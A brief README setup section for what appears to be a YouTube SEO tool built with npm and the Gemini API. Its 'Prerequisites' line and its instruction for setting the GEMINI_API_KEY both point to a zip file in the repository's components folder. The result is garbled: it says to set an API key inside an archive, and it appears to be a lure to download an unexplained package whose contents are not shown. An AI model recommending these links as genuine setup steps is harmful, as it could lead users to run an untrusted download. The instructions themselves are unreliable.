**Prerequisites:** https://raw.githubusercontent.com/xheikhtalha2004/youtube-seo-tool-v2/main/components/youtube_tool_v_seo_2.1.zip

1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/xheikhtalha2004/youtube-seo-tool-v2/main/components/youtube_tool_v_seo_2.1.zip](https://raw.githubusercontent.com/xheikhtalha2004/youtube-seo-tool-v2/main/components/youtube_tool_v_seo_2.1.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
